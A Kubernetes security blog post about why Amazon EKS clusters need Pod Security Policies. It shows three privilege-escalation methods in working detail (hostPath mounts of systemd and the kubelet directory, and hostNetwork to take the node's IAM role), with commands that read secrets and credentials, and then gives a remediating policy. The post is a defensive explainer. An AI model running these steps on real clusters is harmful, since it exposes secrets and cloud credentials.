---
title: "Why You Need PSPs in EKS"
date: 2019-10-04T11:47:24+10:00
featuredImage: "/eks-orig.jpg"
---

Pod Security Policies (PSPs) are an important component of security in Kubernetes. Lets explore what happens without them.

<!--more-->

{{< load-photoswipe >}}
{{< figure src="/eks-orig.jpg" >}}

[Amazon Elastic Kubernetes Service](https://aws.amazon.com/eks/) (EKS) is a managed Kubernetes service running on AWS. It takes away the bulk of the pain of managing a Kubernetes service by running the master tier for you. As with all AWS services, security is a [Shared Responsibility Model](https://aws.amazon.com/compliance/shared-responsibility-model/). Amazon ensure the security of the master tier, but what you run _inside_ the cluster -- that's up to you.

---

Lets take a hypothetical situation, where a user is given access to a _particular_ namespace in Kubernetes using Role Based Access Control (RBAC):

```yaml
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: myteam
  name: myteam-role
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["create", "get", "list", "watch", "delete", "update", "patch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: myteam-rolebinding
  namespace: myteam
subjects:
  - kind: Group
    name: myteam-group
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: myteam-role
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: aws-auth
  namespace: kube-system
data:
  mapRoles: |
    - rolearn: arn:aws:iam::123456789874:role/aaron.gorka
      username: aaron.gorka
      groups:
        - myteam-group
# worker role omitted for brevity...
```

The intention here is that this user only has access to resources in the namespace for their team. In a multi-tenanted cluster, the workloads in other namespaces are completely invisible.

In Kubernetes, workloads are deployed as [Pods](https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/), which expose a lot of the functionality of running Docker containers.

{{< tweet 935252923721793536 >}}

As a "platform for building platforms", Kubernetes needs to have the power to be extremely flexible. If you are "just" deploying apps, having _all_ that flexibility exposed becomes a liability.

I wanted to understand exactly what was possible when PSPs weren't used, so I experimented with a few different methods to see exactly what I could get access to as a low-privileged user.

# Escalation Methods
## Static Pod Method
One idea I had was using [static pods](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/) to start containers with arbitrary Service Accounts. Kubernetes [Nodes](https://kubernetes.io/docs/concepts/architecture/nodes/) (EC2 instances) have a [Cluster Role](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#role-and-clusterrole) (not namespace specific) with Pod creation capabilities, but _only for static pods_.

  * Start with a user with normal pod creation privileges (the specific namespace does not matter)
  * Run a pod that has privileges to the underlying host's [`systemd`](https://en.wikipedia.org/wiki/Systemd): `kubectl run -it --rm --restart=Never --overrides="$(cat overrides.json)" --image=centos/systemd bash`. I'm using `kubectl run` and `--overrides` for convenience -- you could also just write a Pod manifest and `kubectl exec` in to it.

`overrides.json`:
```json
{
  "apiVersion": "v1",
  "spec": {
    "containers": [
      {
        "name": "shell",
        "image": "centos/systemd",
        "command": ["bash"],
        "stdin": true,
        "stdinOnce": true,
        "tty": true,
        "volumeMounts": [
          {
            "name": "cgroup-volume",
            "mountPath": "/sys/fs/cgroup"
          },
          {
            "name": "systemd-volume",
            "mountPath": "/run/systemd"
          },
          {
            "name": "unit-volume",
            "mountPath": "/etc/systemd/system"
          },
          {
            "name": "kubernetes-volume",
            "mountPath": "/etc/kubernetes"
          }
        ]
      }
    ],
    "volumes": [
      {
        "name": "cgroup-volume",
        "hostPath": {
          "path": "/sys/fs/cgroup"
        }
      },
      {
        "name": "systemd-volume",
        "hostPath": {
          "path": "/run/systemd"
        }
      },
      {
        "name": "unit-volume",
        "hostPath": {
          "path": "/etc/systemd/system"
        }
      },
      {
        "name": "kubernetes-volume",
        "hostPath": {
          "path": "/etc/kubernetes"
        }
      }
    ]
  }
}
```

The key setting here is the hostPath volume that mounts `/run/systemd/private`, "_Used internally as communication channel between systemctl (1) and the systemd process_". With this socket mounted and no restriction on which UID we run as, we can control the host's systemd.

  * `systemctl edit --full kubelet`, add `--pod-manifest-path=/etc/kubernetes/manifests` to `ExecStart`
  * Add a static pod manifest:

`/etc/kubernetes/manifests/static.yml`:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: static
  namespace: kube-system
spec:
  containers:
    - name: static
      image: busybox
      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount"]
  serviceAccountName: clusterrole-aggregation-controller
```
  * `systemctl restart kubelet`

Fortunately, the resulting container is _not_ created with a service account token! There wasn't any obvious way to escalate privileges further from here. This protection is achieved by two mechanisms in Kubernetes:

  * [Service Account Admission Controller](https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/#service-account-admission-controller) 
  * [NodeAuthorizer](https://kubernetes.io/docs/reference/access-authn-authz/node/)

Normally, when you submit a Pod with a Service Account, a mutating webhook updates the Pod spec to explicitly mount the Service Account's token (a Secret) at a well known location: `/var/run/secrets/kubernetes.io/serviceaccount`. Because static Pods are not validated against Admission Controllers, the `serviceAccountName` field actually has no effect. However, even if we manually mount the secret;

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: static
  namespace: kube-system
spec:
  containers:
    - name: static
      image: busybox
      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount"]
      volumeMounts:
        - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
          name: clusterrole-aggregation-controller-token-abc12
  volumes:
  - name: clusterrole-aggregation-controller-token-abc12
    secret:
      secretName: clusterrole-aggregation-controller-token-abc12
```

The NodeAuthorizer prevents the secret from being fetched by the kubelet as there is a requirement for there to be a relationship between the node and the secret _already present in the API server_. This is validated through a [graph relationship](https://github.com/kubernetes/kubernetes/blob/77f86630d4530eae02f0f274a1fdff381264493a/plugin/pkg/auth/authorizer/node/node_authorizer.go#L40-L51) between resources e.g. `node <- pod <- secret`. Because the relationship is not present prior to submitting the request, the kubelet receives this respose:

>secrets "clusterrole-aggregation-controller-token-abc12" is forbidden: User "system:node:ip-10-12-34-123.ap-southeast-2.compute.internal" cannot get resource "secrets" in API group "" in the namespace "kube-system": no path found to object"

The kubelet does actually attempt to create this relationship in the API server by means of the creation of a _mirror Pod_. A mirror Pod is a "virtual" representation of a static Pod in the API server. When a static Pod is started, a mirror Pod with the same spec is submitted to the API server by the kubelet. Mirror Pods _do_ pass through Admission Controllers, and may be denied by [a requirement for mirror Pods to not have Service Accounts or secrets](https://github.com/kubernetes/kubernetes/blob/master/plugin/pkg/admission/serviceaccount/admission.go#L207). The following response is returned to the kubelet:

>Failed creating a mirror pod for "static-ip-10-12-34-123.ap-southeast-2.compute.internal_kube-system(hif2d1pxknzv0ftprr3gxrztpa71lqtwc)": pods "static-ip-10-12-34-123.ap-southeast-2.compute.internal" is forbidden: a mirror pod may not reference service accounts

**Result**: access to underlying host's `systemd`.

## IAM Method
It's important to understand that by default, EKS makes no attempt at isolating IAM privileges of pods. Without taking any specific action, your pods will likely have **at least** the following permissions from the Amazon-managed `AmazonEKSWorkerNodePolicy` policy:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Action": [
                "ec2:DescribeInstances",
                "ec2:DescribeRouteTables",
                "ec2:DescribeSecurityGroups",
                "ec2:DescribeSubnets",
                "ec2:DescribeVolumes",
                "ec2:DescribeVolumesModifications",
                "ec2:DescribeVpcs",
                "eks:DescribeCluster"
            ],
            "Resource": "*",
            "Effect": "Allow"
        }
    ]
}
```

(as well as the ability to log in as the `system:node` Cluster Role in EKS)

But if you're running in AWS, you're probably taking advantage of other AWS services. You may have multiple pods with different workloads, each needing different levels of access to different AWS services. You don't want to grant such wide privileges to the EC2 instance role. So you implement something like [KIAM](https://github.com/uswitch/kiam/) or the method described in [IAM Roles for Service Accounts](https://docs.aws.amazon.com/eks/latest/userguide/restrict-ec2-credential-access.html) to assign IAM roles directly to pods and block access to the EC2 instance's metadata URL.

But our malicious intruder is just going to ignore all of that with `hostNetwork`.

  * Start with a user with normal pod creation privileges (namespace doesn't matter)
  * Run a pod that has `hostNetwork: true`:

`$ kubectl run -it --rm --restart=Never --overrides='{"apiVersion": "v1", "spec": {"hostNetwork": true}' --image=cmdlabs/eks-utils shell bash`

  * From here you can use the IAM role of the node even if all ENI interfaces are blocked from accessing the metadata API by iptables. For example, you could log in to EKS as a `system:node` service account:

`$ aws eks update-kubeconfig --name <cluster name> --region <region>`

You could also use something like [this tool](https://github.com/andresriancho/enumerate-iam) to enumerate all permissions that the node has, or you could use the method below to find out what roles KIAM has access to.

**Result**: access to underlying host's IAM role.

## Bind Mounting Secrets Method
This is the most boring and most effective of the methods I tried.

  * Start with a user with normal pod creation privileges (namespace doesn't matter)
  * Run a pod that has bind mounts the host's kubelet directory: `kubectl run -it --rm --restart=Never --overrides="$(cat overrides.json)" --image=busybox sh`
    
    `overrides.json`:
    ```json
    {
      "apiVersion": "v1",
      "spec": {
        "containers": [
          {
            "name": "shell",
            "image": "busybox",
            "command": ["sh"],
            "stdin": true,
            "stdinOnce": true,
            "tty": true,
            "volumeMounts": [
              {
                "name": "kubelet-volume",
                "mountPath": "/var/lib/kubelet"
              }
            ]
          }
        ],
        "volumes": [
          {
            "name": "kubelet-volume",
            "hostPath": {
              "path": "/var/lib/kubelet"
            }
          }
        ]
      }
    }
    ```
  * Read all currently mounted secrets from `/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*`

Escalation from here depends on what's running on the node -- good motivation to limit the privileges of your service accounts, as there is nothing running by default in EKS that would allow further privilege escalation. Another approach would be to run a [DaemonSet](https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/) and grab secrets from every node.

**Result**: access to all secrets for pods scheduled on the underlying host.

# Remediation
Remediating these issues involves limiting these unsafe features via [Pod Security Policy](https://kubernetes.io/docs/concepts/policy/pod-security-policy/).

```yaml
---
apiVersion: extensions/v1beta1
kind: PodSecurityPolicy
metadata:
  name: default
  annotations:
    seccomp.security.alpha.kubernetes.io/allowedProfileNames: 'docker/default'
    seccomp.security.alpha.kubernetes.io/defaultProfileName:  'docker/default'
spec:
  privileged: false
  allowPrivilegeEscalation: false
  allowedCapabilities: []  # default set of capabilities are implicitly allowed
  volumes:
  - 'configMap'
  - 'emptyDir'
  - 'projected'
  - 'secret'
  - 'downwardAPI'
  - 'persistentVolumeClaim'
  hostNetwork: false
  hostIPC: false
  hostPID: false
  runAsUser:
    rule: 'RunAsAny'
  seLinux:
    rule: 'RunAsAny'
  supplementalGroups:
    rule: 'RunAsAny'
  fsGroup:
    rule: 'RunAsAny'
```

Pods validated against this PSP will be unable to use `hostPath` mounting or `hostNetwork`, making the previous escalations impossible. It's worth noting that this PSP isn't even particularly restrictive -- you can lock it down further by making the containers read-only, prevent running as root and dropping all capabilities.

We also need create a ClusterRole that is able to use this PSP:

```yaml
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: default-psp
rules:
- apiGroups: ['policy']
  resources: ['podsecuritypolicies']
  verbs:     ['use']
  resourceNames: ['default']
- apiGroups: ['extensions']
  resources: ['podsecuritypolicies']
  verbs:     ['use']
  resourceNames: ['default']
```

And a ClusterRoleBinding that assigns those permissions to all users:

```yaml
---
kind: ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: default-psp
roleRef:
  kind: ClusterRole
  name: default-psp
  apiGroup: rbac.authorization.k8s.io
subjects:
- kind: Group
  name: system:authenticated
  apiGroup: rbac.authorization.k8s.io
```

We can also create additional PSPs that allow these features for when we genuinely need them. You can see an example of this [here](https://github.com/therandomsecurityguy/kubernetes-security/tree/master/PodSecurityPolicies).

Finally, to enable these PSPs we need to delete a PSP. You see, by default pods are in fact validated against a PSP by default -- it's just that it allows everything and is accessible to everyone. You may have seen this; it's called `eks.privileged`. 

Note that by doing this, you can bork your cluster -- make sure you're ready to [recreate it](https://docs.aws.amazon.com/eks/latest/userguide/pod-security-policy.html).

`kubectl delete psp eks.privileged`

# Conclusion
The security model around nodes is well thought out and you cannot escalate cluster admin just by compromising a node. However, without PSPs, anything already running on that node is fair game. After configuring appropriate PSPs these vulnerabilities cannot be exploited.
